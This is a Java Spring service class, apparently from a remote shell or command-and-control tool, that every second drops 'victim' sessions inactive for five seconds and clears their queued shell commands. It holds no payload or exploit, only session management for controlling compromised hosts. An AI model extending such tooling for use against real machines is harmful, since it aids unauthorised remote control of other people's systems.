package nl.byron.hacking.service;

import nl.byron.hacking.controller.ShellController;
import nl.byron.hacking.controller.TunnelController;
import nl.byron.hacking.model.ShellCommand;
import nl.byron.hacking.model.Victim;
import org.joda.time.DateTime;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.Map;

/**
 * @author Byron Voorbach
 */
@Component
public class CheckActiveSessionService  {

    @Autowired
    private TunnelController tunnelController;

    @Autowired
    private ShellController shellController;

    @Scheduled(fixedDelay = 1000)
    public void checkActiveConnection() {
        System.out.println("***** checking active connections *****");
        ArrayList<Victim> victims = tunnelController.getVictims();

        DateTime currentDateTime = new DateTime();
        for (Victim victim : victims) {
            if (currentDateTime.getMillis() - victim.getLastSeenAsDateTime().getMillis() > 5000) {
                System.out.println("Session became invalid: " + victim.getId());
                victims.remove(victim);
                tunnelController.setVictims(victims);

                Map<String,ArrayList<ShellCommand>> victimCommands = shellController.getVictimCommands();
                victimCommands.remove(victim.getId());
                shellController.setVictimCommands(victimCommands);
            }
        }
    }
}
